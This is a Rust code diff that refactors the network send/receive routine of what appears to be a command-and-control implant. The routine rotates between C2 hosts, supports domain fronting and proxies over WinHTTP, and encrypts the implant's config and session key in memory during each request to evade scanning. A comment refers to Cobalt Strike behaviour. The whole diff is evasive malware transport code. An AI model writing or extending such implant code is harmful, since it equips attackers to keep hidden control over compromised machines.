@@ -53,17 +53,7 @@ const fn safe_http_enabled() -> bool {
 /// wrapped in `mem::mask()` / `mem::unmask()` so registered sensitive regions
 /// (config, session key) are RC4-encrypted during the network request window.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
-    // Determine which host to connect to this cycle.
-    let host_bytes: &[u8] = match super::select_rotation_host(&ctx.rotation_hosts) {
-        Some(h) => h,
-        None => ctx.server_host.as_bytes(),
-    };
-
-    // Check if any enhancement is active.
-    let has_fronting = !ctx.fronting_host.is_empty();
-    let has_proxy = !ctx.proxy_server.is_empty();
-    let has_rotation = !ctx.rotation_hosts.is_empty();
-    let use_enhanced = has_fronting || has_proxy || has_rotation;
+    let (host_bytes, use_enhanced, has_rotation) = send_recv_select_target(ctx);
 
     // safe_http: mask registered sensitive regions (config/key/token) BEFORE
     // the WinHTTP call, unmask AFTER the response is fully read. The frame
@@ -80,15 +70,57 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
         crate::mem::mask();
     }
 
+    let result = send_recv_dispatch(ctx, host_bytes, frame, use_enhanced);
+
+    if safe_http_enabled() {
+        // Restore cleartext — mask() and unmask() are idempotent-guarded, so
+        // this is safe even if mask() was a no-op (state was already clear).
+        crate::mem::unmask();
+    }
+
+    // On failure with rotation active, advance past this host (CS 4.10 hold).
+    if result.is_none() && has_rotation {
+        super::advance_rotation_host();
+    }
+
+    result
+}
+
+/// Determine which host to connect to this cycle and whether any spec-7
+/// enhancement (fronting/proxy/rotation) is active. Returns
+/// (host, use_enhanced, has_rotation).
+fn send_recv_select_target(ctx: &ChannelCtx) -> (&[u8], bool, bool) {
+    // Determine which host to connect to this cycle.
+    let host_bytes: &[u8] = match super::select_rotation_host(&ctx.rotation_hosts) {
+        Some(h) => h,
+        None => ctx.server_host.as_bytes(),
+    };
+
+    // Check if any enhancement is active.
+    let has_fronting = !ctx.fronting_host.is_empty();
+    let has_proxy = !ctx.proxy_server.is_empty();
+    let has_rotation = !ctx.rotation_hosts.is_empty();
+    let use_enhanced = has_fronting || has_proxy || has_rotation;
+    (host_bytes, use_enhanced, has_rotation)
+}
+
+/// Dispatch to the enhanced (proxy + domain fronting + rotation) or the
+/// plain WinHTTP path.
+unsafe fn send_recv_dispatch(
+    ctx: &ChannelCtx,
+    host_bytes: &[u8],
+    frame: &[u8],
+    use_enhanced: bool,
+) -> Option<Vec<u8>> {
     let result = if use_enhanced {
         // Enhanced path: proxy + domain fronting + rotation.
         let opts = crate::transport::HttpOpts {
-            fronting_host: if has_fronting {
+            fronting_host: if !ctx.fronting_host.is_empty() {
                 ctx.fronting_host.as_bytes()
             } else {
                 b""
             },
-            proxy_url: if has_proxy {
+            proxy_url: if !ctx.proxy_server.is_empty() {
                 ctx.proxy_server.as_bytes()
             } else {
                 b""
@@ -116,17 +148,5 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
             )
         }
     };
-
-    if safe_http_enabled() {
-        // Restore cleartext — mask() and unmask() are idempotent-guarded, so
-        // this is safe even if mask() was a no-op (state was already clear).
-        crate::mem::unmask();
-    }
-
-    // On failure with rotation active, advance past this host (CS 4.10 hold).
-    if result.is_none() && has_rotation {
-        super::advance_rotation_host();
-    }
-
     result
 }
